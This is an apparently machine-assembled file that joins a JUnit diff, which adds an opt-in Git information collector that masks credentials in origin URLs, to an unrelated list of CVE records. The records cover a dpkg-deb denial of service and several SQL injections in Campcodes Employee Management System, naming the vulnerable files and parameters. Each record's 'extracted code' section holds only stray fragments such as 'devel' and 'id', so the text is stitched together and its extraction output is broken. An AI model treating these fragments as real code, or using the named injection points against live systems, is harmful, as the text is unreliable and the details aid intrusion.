diff --git a/documentation/src/docs/asciidoc/user-guide/advanced-topics/junit-platform-reporting.adoc b/documentation/src/docs/asciidoc/user-guide/advanced-topics/junit-platform-reporting.adoc
index 79f67cc42404..3eb5f68ec03c 100644
--- a/documentation/src/docs/asciidoc/user-guide/advanced-topics/junit-platform-reporting.adoc
+++ b/documentation/src/docs/asciidoc/user-guide/advanced-topics/junit-platform-reporting.adoc
@@ -36,10 +36,12 @@ event-based format specified by {OpenTestReporting} which supports all features
 JUnit Platform such as hierarchical test structures, display names, tags, etc.
 
 The listener is auto-registered and can be configured via the following
-<<running-tests-config-params, configuration parameter>>:
+<<running-tests-config-params, configuration parameters>>:
 
 `junit.platform.reporting.open.xml.enabled=true|false`::
-  Enable/disable writing the report.
+  Enable/disable writing the report; defaults to `false`.
+`junit.platform.reporting.open.xml.git.enabled=true|false`::
+  Enable/disable including information about the Git repository (see https://github.com/ota4j-team/open-test-reporting#git[Git extension schema] of open-test-reporting); defaults to `false`.
 
 If enabled, the listener creates an XML report file named `open-test-report.xml` in the
 configured <<junit-platform-reporting-output-directory, output directory>>.
diff --git a/gradle/plugins/common/src/main/kotlin/junitbuild.testing-conventions.gradle.kts b/gradle/plugins/common/src/main/kotlin/junitbuild.testing-conventions.gradle.kts
index b79be1dbbeed..d0198e735c94 100644
--- a/gradle/plugins/common/src/main/kotlin/junitbuild.testing-conventions.gradle.kts
+++ b/gradle/plugins/common/src/main/kotlin/junitbuild.testing-conventions.gradle.kts
@@ -130,6 +130,7 @@ tasks.withType<Test>().configureEach {
 	jvmArgumentProviders += CommandLineArgumentProvider {
 		listOf(
 			"-Djunit.platform.reporting.open.xml.enabled=true",
+			"-Djunit.platform.reporting.open.xml.git.enabled=true",
 			"-Djunit.platform.reporting.output.dir=${reports.junitXml.outputLocation.get().asFile.absolutePath}/junit-{uniqueNumber}",
 		)
 	}
diff --git a/junit-platform-reporting/src/main/java/org/junit/platform/reporting/open/xml/GitInfoCollector.java b/junit-platform-reporting/src/main/java/org/junit/platform/reporting/open/xml/GitInfoCollector.java
new file mode 100644
index 000000000000..1bd95732f2d4
--- /dev/null
+++ b/junit-platform-reporting/src/main/java/org/junit/platform/reporting/open/xml/GitInfoCollector.java
@@ -0,0 +1,209 @@
+/*
+ * Copyright 2015-2025 the original author or authors.
+ *
+ * All rights reserved. This program and the accompanying materials are
+ * made available under the terms of the Eclipse Public License v2.0 which
+ * accompanies this distribution and is available at
+ *
+ * https://www.eclipse.org/legal/epl-v20.html
+ */
+
+package org.junit.platform.reporting.open.xml;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.Reader;
+import java.io.UncheckedIOException;
+import java.net.URI;
+import java.net.URISyntaxException;
+import java.nio.charset.Charset;
+import java.nio.file.Path;
+import java.util.Optional;
+import java.util.concurrent.TimeUnit;
+import java.util.function.BiConsumer;
+
+import org.junit.platform.commons.util.ExceptionUtils;
+import org.junit.platform.commons.util.StringUtils;
+
+/**
+ * @since 5.13.2
+ */
+interface GitInfoCollector {
+
+	static Optional<GitInfoCollector> get(Path workingDir) {
+		ProcessExecutor executor = new ProcessExecutor(workingDir);
+		boolean gitInstalled = executor.exec("git", "--version").isPresent();
+		return gitInstalled ? Optional.of(new CliGitInfoCollector(executor)) : Optional.empty();
+	}
+
+	Optional<String> getOriginUrl();
+
+	Optional<String> getBranch();
+
+	Optional<String> getCommitHash();
+
+	Optional<String> getStatus();
+
+	class CliGitInfoCollector implements GitInfoCollector {
+
+		private static final String ALLOWED_USERNAME = "git";
+		private static final String USER_INFO_REPLACEMENT = "***";
+		private static final String USER_INFO_SEPARATOR = "@";
+
+		private final ProcessExecutor executor;
+
+		public CliGitInfoCollector(ProcessExecutor executor) {
+			this.executor = executor;
+		}
+
+		@Override
+		public Optional<String> getOriginUrl() {
+			return executor.exec("git", "config", "--get", "remote.origin.url") //
+					.filter(StringUtils::isNotBlank) //
+					.flatMap(this::toGitUrl) //
+					.flatMap(this::obfuscateUserInfo);
+		}
+
+		@Override
+		public Optional<String> getBranch() {
+			return executor.exec("git", "rev-parse", "--abbrev-ref", "HEAD") //
+					.filter(StringUtils::isNotBlank);
+		}
+
+		@Override
+		public Optional<String> getCommitHash() {
+			return executor.exec("git", "rev-parse", "--verify", "HEAD") //
+					.filter(StringUtils::isNotBlank);
+		}
+
+		@Override
+		public Optional<String> getStatus() {
+			return executor.exec("git", "status", "--porcelain");
+		}
+
+		private Optional<String> obfuscateUserInfo(GitUrl gitUrl) {
+			try {
+				if (gitUrl.uri.getUserInfo() != null) {
+					URI newUri = new URI(gitUrl.uri.getScheme(), USER_INFO_REPLACEMENT, gitUrl.uri.getHost(),
+						gitUrl.uri.getPort(), gitUrl.uri.getPath(), gitUrl.uri.getQuery(), gitUrl.uri.getFragment());
+					return Optional.of(newUri.toString().substring(gitUrl.addedPrefix.length()));
+				}
+				if (gitUrl.uri.getAuthority() != null && gitUrl.uri.getAuthority().contains(USER_INFO_SEPARATOR)) {
+					String oldAuthority = gitUrl.uri.getAuthority();
+					String[] parts = oldAuthority.split(USER_INFO_SEPARATOR, 2);
+					if (!ALLOWED_USERNAME.equals(parts[0])) {
+						String newAuthority = USER_INFO_REPLACEMENT + USER_INFO_SEPARATOR + parts[1];
+						URI newUri = new URI(gitUrl.uri.getScheme(), newAuthority, gitUrl.uri.getPath(),
+							gitUrl.uri.getQuery(), gitUrl.uri.getFragment());
+						return Optional.of(newUri.toString().substring(gitUrl.addedPrefix.length()));
+					}
+				}
+				return Optional.of(gitUrl.rawValue);
+			}
+			catch (URISyntaxException e) {
+				return Optional.empty();
+			}
+		}
+
+		private Optional<GitUrl> toGitUrl(String remoteUrl) {
+			try {
+				return Optional.of(new GitUrl(remoteUrl, new URI(remoteUrl), ""));
+			}
+			catch (URISyntaxException ex) {
+				try {
+					return Optional.of(new GitUrl(remoteUrl, new URI("ssh://" + remoteUrl), "ssh://"));
+				}
+				catch (URISyntaxException ignore) {
+					return Optional.empty();
+				}
+			}
+		}
+	}
+
+	class ProcessExecutor {
+
+		private final Path workingDir;
+
+		ProcessExecutor(Path workingDir) {
+			this.workingDir = workingDir;
+		}
+
+		Optional<String> exec(String... args) {
+
+			Process process = startProcess(args);
+
+			try (Reader out = newBufferedReader(process.getInputStream());
+					Reader err = newBufferedReader(process.getErrorStream())) {
+
+				StringBuilder output = new StringBuilder();
+				readAllChars(out, (chars, numChars) -> output.append(chars, 0, numChars));
+
+				readAllChars(err, (__, ___) -> {
+					// ignore
+				});
+
+				boolean terminated = process.waitFor(10, TimeUnit.SECONDS);
+				return terminated && process.exitValue() == 0 ? Optional.of(trimAtEnd(output)) : Optional.empty();
+			}
+			catch (InterruptedException e) {
+				throw ExceptionUtils.throwAsUncheckedException(e);
+			}
+			catch (IOException ignore) {
+				return Optional.empty();
+			}
+			finally {
+				process.destroyForcibly();
+			}
+		}
+
+		private static BufferedReader newBufferedReader(InputStream stream) {
+			return new BufferedReader(new InputStreamReader(stream, Charset.defaultCharset()));
+		}
+
+		private Process startProcess(String[] command) {
+			Process process;
+			try {
+				process = new ProcessBuilder().directory(workingDir.toFile()).command(command).start();
+			}
+			catch (IOException e) {
+				throw new UncheckedIOException("Failed to start process", e);
+			}
+			return process;
+		}
+
+		private static void readAllChars(Reader reader, BiConsumer<char[], Integer> consumer) throws IOException {
+			char[] buffer = new char[1024];
+			int numChars;
+			while ((numChars = reader.read(buffer)) != -1) {
+				consumer.accept(buffer, numChars);
+			}
+		}
+
+		private static String trimAtEnd(StringBuilder value) {
+			int endIndex = value.length();
+			for (int i = value.length() - 1; i >= 0; i--) {
+				if (Character.isWhitespace(value.charAt(i))) {
+					endIndex--;
+					break;
+				}
+			}
+			return value.substring(0, endIndex);
+		}
+	}
+
+	class GitUrl {
+
+		private final String rawValue;
+		private final URI uri;
+		private final String addedPrefix;
+
+		GitUrl(String rawValue, URI uri, String addedPrefix) {
+			this.rawValue = rawValue;
+			this.uri = uri;
+			this.addedPrefix = addedPrefix;
+		}
+	}
+
+}
diff --git a/junit-platform-reporting/src/main/java/org/junit/platform/reporting/open/xml/OpenTestReportGeneratingListener.java b/junit-platform-reporting/src/main/java/org/junit/platform/reporting/open/xml/OpenTestReportGeneratingListener.java
index 4b7ef84dd8a0..822c6852959b 100644
--- a/junit-platform-reporting/src/main/java/org/junit/platform/reporting/open/xml/OpenTestReportGeneratingListener.java
+++ b/junit-platform-reporting/src/main/java/org/junit/platform/reporting/open/xml/OpenTestReportGeneratingListener.java
@@ -51,30 +51,20 @@
 import static org.opentest4j.reporting.events.root.RootFactory.reported;
 import static org.opentest4j.reporting.events.root.RootFactory.started;
 
-import java.io.BufferedReader;
 import java.io.IOException;
-import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.io.Reader;
 import java.io.UncheckedIOException;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
-import java.nio.charset.Charset;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.time.Instant;
 import java.time.LocalDateTime;
 import java.util.Map;
-import java.util.Optional;
 import java.util.concurrent.ConcurrentHashMap;
-import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicInteger;
-import java.util.function.BiConsumer;
 
 import org.apiguardian.api.API;
 import org.junit.platform.commons.JUnitException;
-import org.junit.platform.commons.util.ExceptionUtils;
-import org.junit.platform.commons.util.StringUtils;
 import org.junit.platform.engine.ConfigurationParameters;
 import org.junit.platform.engine.TestExecutionResult;
 import org.junit.platform.engine.TestSource;
@@ -110,6 +100,7 @@
 public class OpenTestReportGeneratingListener implements TestExecutionListener {
 
 	static final String ENABLED_PROPERTY_NAME = "junit.platform.reporting.open.xml.enabled";
+	static final String GIT_ENABLED_PROPERTY_NAME = "junit.platform.reporting.open.xml.git.enabled";
 
 	private final AtomicInteger idCounter = new AtomicInteger();
 	private final Map<UniqueId, String> inProgressIds = new ConcurrentHashMap<>();
@@ -140,7 +131,7 @@ public void testPlanExecutionStarted(TestPlan testPlan) {
 			Path eventsXml = outputDir.resolve("open-test-report.xml");
 			try {
 				eventsFileWriter = Events.createDocumentWriter(namespaceRegistry, eventsXml);
-				reportInfrastructure();
+				reportInfrastructure(config);
 			}
 			catch (Exception e) {
 				throw new JUnitException("Failed to initialize XML events file: " + eventsXml, e);
@@ -148,11 +139,15 @@ public void testPlanExecutionStarted(TestPlan testPlan) {
 		}
 	}
 
-	private Boolean isEnabled(ConfigurationParameters config) {
+	private boolean isEnabled(ConfigurationParameters config) {
 		return config.getBoolean(ENABLED_PROPERTY_NAME).orElse(false);
 	}
 
-	private void reportInfrastructure() {
+	private boolean isGitEnabled(ConfigurationParameters config) {
+		return config.getBoolean(GIT_ENABLED_PROPERTY_NAME).orElse(false);
+	}
+
+	private void reportInfrastructure(ConfigurationParameters config) {
 		eventsFileWriter.append(infrastructure(), infrastructure -> {
 			try {
 				String hostName = InetAddress.getLocalHost().getHostName();
@@ -168,89 +163,23 @@ private void reportInfrastructure() {
 					.append(fileEncoding(System.getProperty("file.encoding"))) //
 					.append(heapSize(), heapSize -> heapSize.withMax(Runtime.getRuntime().maxMemory()));
 
-			addGitInfo(infrastructure);
+			if (isGitEnabled(config)) {
+				GitInfoCollector.get(workingDir).ifPresent(git -> addGitInfo(infrastructure, git));
+			}
 		});
 	}
 
-	private void addGitInfo(Infrastructure infrastructure) {
-		boolean gitInstalled = exec("git", "--version").isPresent();
-		if (gitInstalled) {
-			exec("git", "config", "--get", "remote.origin.url") //
-					.filter(StringUtils::isNotBlank) //
-					.ifPresent(
-						gitUrl -> infrastructure.append(repository(), repository -> repository.withOriginUrl(gitUrl)));
-			exec("git", "rev-parse", "--abbrev-ref", "HEAD") //
-					.filter(StringUtils::isNotBlank) //
-					.ifPresent(branch -> infrastructure.append(branch(branch)));
-			exec("git", "rev-parse", "--verify", "HEAD") //
-					.filter(StringUtils::isNotBlank) //
-					.ifPresent(gitCommitHash -> infrastructure.append(commit(gitCommitHash)));
-			exec("git", "status", "--porcelain") //
-					.ifPresent(statusOutput -> infrastructure.append(status(statusOutput),
-						status -> status.withClean(statusOutput.isEmpty())));
-		}
-	}
-
-	Optional<String> exec(String... args) {
-
-		Process process = startProcess(args);
-
-		try (Reader out = newBufferedReader(process.getInputStream());
-				Reader err = newBufferedReader(process.getErrorStream())) {
-
-			StringBuilder output = new StringBuilder();
-			readAllChars(out, (chars, numChars) -> output.append(chars, 0, numChars));
-
-			readAllChars(err, (__, ___) -> {
-				// ignore
-			});
-
-			boolean terminated = process.waitFor(10, TimeUnit.SECONDS);
-			return terminated && process.exitValue() == 0 ? Optional.of(trimAtEnd(output)) : Optional.empty();
-		}
-		catch (InterruptedException e) {
-			throw ExceptionUtils.throwAsUncheckedException(e);
-		}
-		catch (IOException ignore) {
-			return Optional.empty();
-		}
-		finally {
-			process.destroyForcibly();
-		}
-	}
-
-	private static BufferedReader newBufferedReader(InputStream stream) {
-		return new BufferedReader(new InputStreamReader(stream, Charset.defaultCharset()));
-	}
-
-	private Process startProcess(String[] command) {
-		Process process;
-		try {
-			process = new ProcessBuilder().directory(workingDir.toFile()).command(command).start();
-		}
-		catch (IOException e) {
-			throw new UncheckedIOException("Failed to start process", e);
-		}
-		return process;
-	}
-
-	private static void readAllChars(Reader reader, BiConsumer<char[], Integer> consumer) throws IOException {
-		char[] buffer = new char[1024];
-		int numChars;
-		while ((numChars = reader.read(buffer)) != -1) {
-			consumer.accept(buffer, numChars);
-		}
-	}
-
-	private static String trimAtEnd(StringBuilder value) {
-		int endIndex = value.length();
-		for (int i = value.length() - 1; i >= 0; i--) {
-			if (Character.isWhitespace(value.charAt(i))) {
-				endIndex--;
-				break;
-			}
-		}
-		return value.substring(0, endIndex);
+	private void addGitInfo(Infrastructure infrastructure, GitInfoCollector git) {
+		git.getOriginUrl() //
+				.ifPresent(
+					gitUrl -> infrastructure.append(repository(), repository -> repository.withOriginUrl(gitUrl)));
+		git.getBranch() //
+				.ifPresent(branch -> infrastructure.append(branch(branch)));
+		git.getCommitHash() //
+				.ifPresent(gitCommitHash -> infrastructure.append(commit(gitCommitHash)));
+		git.getStatus() //
+				.ifPresent(statusOutput -> infrastructure.append(status(statusOutput),
+					status -> status.withClean(statusOutput.isEmpty())));
 	}
 
 	@Override
diff --git a/platform-tests/src/test/java/org/junit/platform/reporting/open/xml/OpenTestReportGeneratingListenerTests.java b/platform-tests/src/test/java/org/junit/platform/reporting/open/xml/OpenTestReportGeneratingListenerTests.java
index fdb00cc1fa55..82b747cb45f3 100644
--- a/platform-tests/src/test/java/org/junit/platform/reporting/open/xml/OpenTestReportGeneratingListenerTests.java
+++ b/platform-tests/src/test/java/org/junit/platform/reporting/open/xml/OpenTestReportGeneratingListenerTests.java
@@ -23,6 +23,7 @@
 import static org.junit.platform.launcher.core.LauncherDiscoveryRequestBuilder.request;
 import static org.junit.platform.launcher.core.LauncherFactoryForTestingPurposesOnly.createLauncher;
 import static org.junit.platform.reporting.open.xml.OpenTestReportGeneratingListener.ENABLED_PROPERTY_NAME;
+import static org.junit.platform.reporting.open.xml.OpenTestReportGeneratingListener.GIT_ENABLED_PROPERTY_NAME;
 import static org.junit.platform.reporting.testutil.FileUtils.findPath;
 
 import java.io.PrintStream;
@@ -36,6 +37,7 @@
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.io.TempDir;
 import org.junit.jupiter.params.ParameterizedTest;
+import org.junit.jupiter.params.provider.CsvSource;
 import org.junit.jupiter.params.provider.ValueSource;
 import org.junit.platform.commons.util.ExceptionUtils;
 import org.junit.platform.engine.TestEngine;
@@ -58,6 +60,12 @@
  */
 public class OpenTestReportGeneratingListenerTests {
 
+	private static final Map<String, String> NAMESPACE_CONTEXT = Map.of( //
+		"core", Namespace.REPORTING_CORE.getUri(), //
+		"e", Namespace.REPORTING_EVENTS.getUri(), //
+		"git", Namespace.REPORTING_GIT.getUri() //
+	);
+
 	private PrintStream originalOut;
 	private PrintStream originalErr;
 
@@ -172,7 +180,7 @@ void writesValidXmlReport(@TempDir Path tempDirectory) throws Exception {
 	@ParameterizedTest
 	@ValueSource(strings = { "https://github.com/junit-team/junit-framework.git",
 			"git@github.com:junit-team/junit-framework.git" })
-	void includesGitInfo(String originUrl, @TempDir Path tempDirectory) throws Exception {
+	void includesGitInfoWhenEnabled(String originUrl, @TempDir Path tempDirectory) throws Exception {
 
 		assumeTrue(tryExecGit(tempDirectory, "--version").exitCode() == 0, "git not installed");
 		execGit(tempDirectory, "init", "--initial-branch=my_branch");
@@ -192,36 +200,76 @@ void includesGitInfo(String originUrl, @TempDir Path tempDirectory) throws Excep
 		var xmlFile = findPath(tempDirectory, "glob:**/open-test-report.xml");
 		assertThat(validate(xmlFile)).isEmpty();
 
-		var namespaceContext = Map.of("core", Namespace.REPORTING_CORE.getUri(), "e",
-			Namespace.REPORTING_EVENTS.getUri(), "git", Namespace.REPORTING_GIT.getUri());
+		assertThatXml(xmlFile) //
+				.doesNotHaveXPath("/e:events/core:infrastructure/git:repository");
+		assertThatXml(xmlFile) //
+				.doesNotHaveXPath("/e:events/core:infrastructure/git:branch");
+		assertThatXml(xmlFile) //
+				.doesNotHaveXPath("/e:events/core:infrastructure/git:commit");
+		assertThatXml(xmlFile) //
+				.doesNotHaveXPath("/e:events/core:infrastructure/git:status");
+
+		executeTests(tempDirectory, engine, tempDirectory.resolve("junit-reports"),
+			Map.of(GIT_ENABLED_PROPERTY_NAME, "true"));
+
+		assertThat(validate(xmlFile)).isEmpty();
 
-		XmlAssert.assertThat(xmlFile) //
-				.withNamespaceContext(namespaceContext) //
+		assertThatXml(xmlFile) //
 				.valueByXPath("/e:events/core:infrastructure/git:repository/@originUrl") //
 				.isEqualTo(originUrl);
 
-		XmlAssert.assertThat(xmlFile) //
-				.withNamespaceContext(namespaceContext) //
+		assertThatXml(xmlFile) //
 				.valueByXPath("/e:events/core:infrastructure/git:branch") //
 				.isEqualTo("my_branch");
 
 		var commitHash = execGit(tempDirectory, "rev-parse", "--verify", "HEAD").stdOut().trim();
-		XmlAssert.assertThat(xmlFile) //
-				.withNamespaceContext(namespaceContext) //
+		assertThatXml(xmlFile) //
 				.valueByXPath("/e:events/core:infrastructure/git:commit") //
 				.isEqualTo(commitHash);
 
-		XmlAssert.assertThat(xmlFile) //
-				.withNamespaceContext(namespaceContext) //
+		assertThatXml(xmlFile) //
 				.valueByXPath("/e:events/core:infrastructure/git:status/@clean") //
 				.isEqualTo(false);
 
-		XmlAssert.assertThat(xmlFile) //
-				.withNamespaceContext(namespaceContext) //
+		assertThatXml(xmlFile) //
 				.valueByXPath("/e:events/core:infrastructure/git:status") //
 				.startsWith("?? junit-reports");
 	}
 
+	@ParameterizedTest
+	@CsvSource(textBlock = """
+				https://foo:bar@github.com/junit-team/junit5.git, https://***@github.com/junit-team/junit5.git
+				https://token@github.com/junit-team/junit5.git,   https://***@github.com/junit-team/junit5.git
+				foo@github.com:junit-team/junit5.git,             ***@github.com:junit-team/junit5.git
+				ssh://foo@github.com:junit-team/junit5.git,       ssh://***@github.com:junit-team/junit5.git
+				git@github.com:junit-team/junit5.git,             git@github.com:junit-team/junit5.git
+				ssh://git@github.com:junit-team/junit5.git,       ssh://git@github.com:junit-team/junit5.git
+			""")
+	void stripsCredentialsFromOriginUrl(String configuredUrl, String reportedUrl, @TempDir Path tempDirectory)
+			throws Exception {
+
+		assumeTrue(tryExecGit(tempDirectory, "--version").exitCode() == 0, "git not installed");
+		execGit(tempDirectory, "init", "--initial-branch=my_branch");
+		execGit(tempDirectory, "remote", "add", "origin", configuredUrl);
+
+		var engine = new DemoHierarchicalTestEngine("dummy");
+
+		executeTests(tempDirectory, engine, tempDirectory.resolve("junit-reports"),
+			Map.of(GIT_ENABLED_PROPERTY_NAME, "true"));
+
+		var xmlFile = findPath(tempDirectory, "glob:**/open-test-report.xml");
+		assertThat(validate(xmlFile)).isEmpty();
+
+		assertThatXml(xmlFile) //
+				.valueByXPath("/e:events/core:infrastructure/git:repository/@originUrl") //
+				.isEqualTo(reportedUrl);
+	}
+
+	private static XmlAssert assertThatXml(Path xmlFile) {
+		return XmlAssert.assertThat(xmlFile) //
+				.withNamespaceContext(NAMESPACE_CONTEXT);
+	}
+
 	private static ProcessResult execGit(Path workingDir, String... arguments) throws InterruptedException {
 		var result = tryExecGit(workingDir, arguments);
 		assertEquals(0, result.exitCode(), "git " + String.join(" ", arguments) + " failed");
@@ -242,15 +290,22 @@ private ValidationResult validate(Path xmlFile) throws URISyntaxException {
 		return new DefaultValidator(catalogUri).validate(xmlFile);
 	}
 
-	private void executeTests(Path tempDirectory, TestEngine engine, Path outputDir) {
-		var build = request() //
+	private static void executeTests(Path tempDirectory, TestEngine engine, Path outputDir) {
+		executeTests(tempDirectory, engine, outputDir, Map.of());
+	}
+
+	private static void executeTests(Path tempDirectory, TestEngine engine, Path outputDir,
+			Map<String, String> extraConfigurationParameters) {
+		var request = request() //
 				.selectors(selectUniqueId(UniqueId.forEngine(engine.getId()))) //
+				.enableImplicitConfigurationParameters(false) //
 				.configurationParameter(ENABLED_PROPERTY_NAME, String.valueOf(true)) //
 				.configurationParameter(CAPTURE_STDOUT_PROPERTY_NAME, String.valueOf(true)) //
 				.configurationParameter(CAPTURE_STDERR_PROPERTY_NAME, String.valueOf(true)) //
 				.configurationParameter(OUTPUT_DIR_PROPERTY_NAME, outputDir.toString()) //
+				.configurationParameters(extraConfigurationParameters) //
 				.build();
-		createLauncher(engine).execute(build, new OpenTestReportGeneratingListener(tempDirectory));
+		createLauncher(engine).execute(request, new OpenTestReportGeneratingListener(tempDirectory));
 	}
 
 }


================================================================================


CVE ID: CVE-2025-6297
Published: 2025-07-01T17:15:30.177
Modified: 2025-08-19T17:50:38.047
CVSS Score: 8.2 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N

CWE Categories:
  - CWE-400: Uncontrolled Resource Consumption
  - CWE-732: Incorrect Permission Assignment for Critical Resource

Description:
It was discovered that dpkg-deb does not properly sanitize directory permissions when extracting a control member into a temporary directory, which is
documented as being a safe operation even on untrusted data. This may result in leaving temporary files behind on cleanup. Given automated and repeated execution of dpkg-deb commands on
adversarial .deb packages or with well compressible files, placed
inside a directory with permissions not allowing removal by a non-root
user, this can end up in a DoS scenario due to causing disk quota
exhaustion or disk full conditions.

References (1):
  1. https://git.dpkg.org/cgit/dpkg/dpkg.git/commit/?id=ed6bbd445dd8800308c67236ba35d08004c98e82 [Patch]

Attempting to extract code examples from references...

--- Code from https://git.dpkg.org/cgit/dpkg/dpkg.git/commit/?id=ed6bbd445dd8800308c67236ba35d08004c98e82 ---
devel

================================================================================


CVE ID: CVE-2025-6963
Published: 2025-07-01T16:15:24.377
Modified: 2025-07-07T14:40:29.430
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in Campcodes Employee Management System 1.0 and classified as critical. This vulnerability affects unknown code of the file /myprofile.php. The manipulation of the argument ID leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/41 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.314500 [Permissions Required]
  3. https://vuldb.com/?id.314500 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605910 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314500 ---
id

================================================================================


CVE ID: CVE-2025-6962
Published: 2025-07-01T16:15:24.187
Modified: 2025-07-07T14:40:21.120
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, was found in Campcodes Employee Management System 1.0. This affects an unknown part of the file /myprofileup.php. The manipulation of the argument ID leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/40 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.314499 [Permissions Required]
  3. https://vuldb.com/?id.314499 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605909 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314499 ---
id

================================================================================


CVE ID: CVE-2025-6961
Published: 2025-07-01T16:15:23.970
Modified: 2025-07-07T14:40:04.140
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, has been found in Campcodes Employee Management System 1.0. Affected by this issue is some unknown functionality of the file /mark.php. The manipulation of the argument ID leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/39 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.314498 [Permissions Required]
  3. https://vuldb.com/?id.314498 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605908 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314498 ---
id

================================================================================


CVE ID: CVE-2025-6960
Published: 2025-07-01T15:15:27.260
Modified: 2025-07-07T14:39:53.557
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical was found in Campcodes Employee Management System 1.0. Affected by this vulnerability is an unknown functionality of the file /empproject.php. The manipulation of the argument ID leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/38 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.314497 [Permissions Required]
  3. https://vuldb.com/?id.314497 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605900 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314497 ---
id

================================================================================


CVE ID: CVE-2025-6959
Published: 2025-07-01T15:15:27.083
Modified: 2025-07-07T14:39:44.820
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in Campcodes Employee Management System 1.0. Affected is an unknown function of the file /eloginwel.php. The manipulation of the argument ID leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/37 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.314496 [Permissions Required]
  3. https://vuldb.com/?id.314496 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605899 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314496 ---
id

================================================================================


CVE ID: CVE-2025-6958
Published: 2025-07-01T15:15:26.893
Modified: 2025-07-07T14:39:36.240
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Employee Management System 1.0. It has been rated as critical. This issue affects some unknown processing of the file /edit.php. The manipulation of the argument ID leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/36 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.314495 [Permissions Required]
  3. https://vuldb.com/?id.314495 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605897 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314495 ---
id

================================================================================


CVE ID: CVE-2025-6957
Published: 2025-07-01T15:15:26.710
Modified: 2025-07-07T14:39:24.860
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Employee Management System 1.0. It has been declared as critical. This vulnerability affects unknown code of the file /process/eprocess.php. The manipulation of the argument mailuid leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/35 [Exploit, Third Party Advisory, Issue Tracking]
